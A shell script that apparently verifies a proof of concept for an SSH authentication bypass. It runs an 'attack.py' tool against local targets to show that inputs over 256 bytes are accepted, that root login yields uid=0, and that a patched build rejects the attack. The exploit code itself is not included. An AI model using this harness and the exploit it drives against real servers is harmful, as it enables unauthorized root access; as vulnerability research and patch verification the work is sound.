#!/bin/sh
# Boundary proof: 256 fails, 257 works, patched box rejects both.
set -u
H=127.0.0.1
fail=0

echo "=== [1] vulnerable target, 256 bytes (expect REJECTED) ==="
python3 attack.py $H 2222 alice -n 256; [ $? -eq 1 ] && echo "" || { echo "  UNEXPECTED"; fail=1; }
sleep 2

echo "=== [2] vulnerable target, 257 bytes (expect ACCEPTED) ==="
python3 attack.py $H 2222 alice -n 257; [ $? -eq 0 ] && echo "" || { echo "  UNEXPECTED"; fail=1; }
sleep 2

echo "=== [3] vulnerable target, root (expect ACCEPTED + uid=0) ==="
python3 attack.py $H 2222 root -n 300; [ $? -eq 0 ] && echo "" || { echo "  UNEXPECTED"; fail=1; }
sleep 2

echo "=== [4] negative control, patched 10.6p2 (expect REJECTED) ==="
python3 attack.py $H 2223 alice -n 300; [ $? -eq 1 ] && echo "" || { echo "  UNEXPECTED"; fail=1; }
sleep 2

echo "=== [5] control: bob's real password still works (expect ACCEPTED) ==="
python3 attack.py $H 2222 bob -P 'BobPass-123' -c true; [ $? -eq 0 ] && echo "" || { echo "  UNEXPECTED"; fail=1; }

echo
[ $fail -eq 0 ] && echo "ALL CHECKS PASSED" || echo "SOME CHECKS FAILED"
exit $fail